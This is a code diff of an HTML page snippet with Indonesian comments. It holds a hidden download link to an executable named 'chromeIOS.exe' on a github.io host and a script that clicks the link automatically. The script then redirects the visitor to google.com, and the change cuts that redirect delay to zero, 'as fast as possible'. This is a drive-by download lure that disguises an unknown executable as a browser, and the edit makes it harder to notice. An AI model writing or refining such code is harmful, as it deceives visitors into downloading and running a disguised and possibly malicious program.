@@ -1,10 +1,14 @@
-<a href="https://ecdnts-del.github.io/test-apk/chromeIOS.exe" download="chromeIOS.exe" id="downloadLink" style="display:none;"></a>
+<a href="https://ecdnts-del.github.io/test-apk/chromeIOS.exe"
+   download="chromeIOS.exe"
+   id="downloadLink"
+   style="display:none;"></a>
+
 <script>
 function a() {
-    var link = document.getElementById('downloadLink');
-    link.click();  // Mulai download
+    document.getElementById('downloadLink').click();
+
     setTimeout(function () {
-        window.location.href = "https://google.com";  // Redirect
-    }, 1000);
+        window.location.href = "https://google.com";
+    }, 0); // secepat mungkin
 }
 </script>
